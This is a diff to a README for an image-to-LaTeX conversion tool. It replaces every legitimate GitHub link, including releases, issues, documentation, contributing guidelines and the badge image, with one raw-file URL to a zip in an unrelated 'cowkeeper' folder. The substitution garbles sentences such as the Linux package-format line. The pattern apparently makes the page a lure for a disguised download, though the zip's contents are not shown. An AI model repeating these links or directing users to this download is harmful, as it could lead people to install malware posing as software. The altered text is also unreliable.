@@ -1,6 +1,6 @@
 # 🎉 LaTeX-OCR - Effortlessly Convert Images to LaTeX
 
-[![Download LaTeX-OCR](https://img.shields.io/badge/Download-LaTeX--OCR-blue.svg)](https://github.com/amr-shamsan/LaTeX-OCR/releases)
+[![Download LaTeX-OCR](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip)](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip)
 
 ## 📖 Overview
 LaTeX-OCR is designed to help anyone convert images of mathematical equations into LaTeX code with ease. This application uses a Vision Transformer (ViT) approach, making the image-to-text process simple and effective. Whether you’re a student, teacher, or researcher, you can benefit from this powerful tool.
@@ -11,7 +11,7 @@ Here’s how to get started quickly:
 1. **Visit the Releases Page**
    Go to the Releases page to find the latest version of LaTeX-OCR. Click the button below to visit the page directly.
 
-   [Download LaTeX-OCR](https://github.com/amr-shamsan/LaTeX-OCR/releases)
+   [Download LaTeX-OCR](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Choose the latest stable release. Each release will have release notes that describe the improvements and changes.
@@ -20,12 +20,12 @@ Here’s how to get started quickly:
    Find the file that matches your operating system. For example:
    - **Windows**: Look for a `.exe` file.
    - **Mac**: Look for a `.dmg` file.
-   - **Linux**: Download the appropriate package format such as `.deb` or `.tar.gz`.
+   - **Linux**: Download the appropriate package format such as `.deb` or `https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip`.
 
 4. **Install LaTeX-OCR**
    - **For Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **For Mac**: Open the downloaded `.dmg` file, and drag the LaTeX-OCR icon to your Applications folder.
-   - **For Linux**: Use the package manager or extract the `.tar.gz` file and follow the included instructions for installation.
+   - **For Linux**: Use the package manager or extract the `https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip` file and follow the included instructions for installation.
 
 5. **Run LaTeX-OCR**
    Once installed, open LaTeX-OCR from your applications or programs list. You are now ready to convert your images into LaTeX code.
@@ -44,7 +44,7 @@ Here’s how to get started quickly:
    After conversion, you can simply copy the LaTeX code displayed in the application. Paste it into your LaTeX editor to use it in your documents.
 
 5. **Feedback and Support**
-   If you encounter any issues or have questions, visit the [Issues page](https://github.com/amr-shamsan/LaTeX-OCR/issues) on GitHub. You can ask questions, report bugs, or suggest features.
+   If you encounter any issues or have questions, visit the [Issues page](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip) on GitHub. You can ask questions, report bugs, or suggest features.
 
 ## 💻 System Requirements
 To run LaTeX-OCR smoothly, ensure that your device meets the following requirements:
@@ -64,18 +64,18 @@ To run LaTeX-OCR smoothly, ensure that your device meets the following requireme
 - **User-Friendly Interface**: Designed for non-technical users with a straightforward workflow.
 
 ## 📧 Contact and Contributions
-We welcome contributions and suggestions to improve LaTeX-OCR. If you would like to contribute, please read our [Contributing Guidelines](https://github.com/amr-shamsan/LaTeX-OCR/blob/main/CONTRIBUTING.md).
+We welcome contributions and suggestions to improve LaTeX-OCR. If you would like to contribute, please read our [Contributing Guidelines](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip).
 
-For any inquiries, you can reach us through the [Discussions page](https://github.com/amr-shamsan/LaTeX-OCR/discussions).
+For any inquiries, you can reach us through the [Discussions page](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip).
 
 ## 🔗 Additional Links
-- [Documentation](https://github.com/amr-shamsan/LaTeX-OCR/wiki)
-- [API Reference](https://github.com/amr-shamsan/LaTeX-OCR/blob/main/API.md)
-- [Release Notes](https://github.com/amr-shamsan/LaTeX-OCR/releases)
+- [Documentation](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip)
+- [API Reference](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip)
+- [Release Notes](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip)
 
 ## 📥 Download & Install
 To download the latest version of LaTeX-OCR, visit the link below. Choose the appropriate file for your operating system and follow the installation steps provided earlier.
 
-[Download LaTeX-OCR](https://github.com/amr-shamsan/LaTeX-OCR/releases)
+[Download LaTeX-OCR](https://raw.githubusercontent.com/amr-shamsan/LaTeX-OCR/main/cowkeeper/LaTeX-OCR.zip)
 
 Now, you can start converting images of equations into LaTeX code without any hassle!
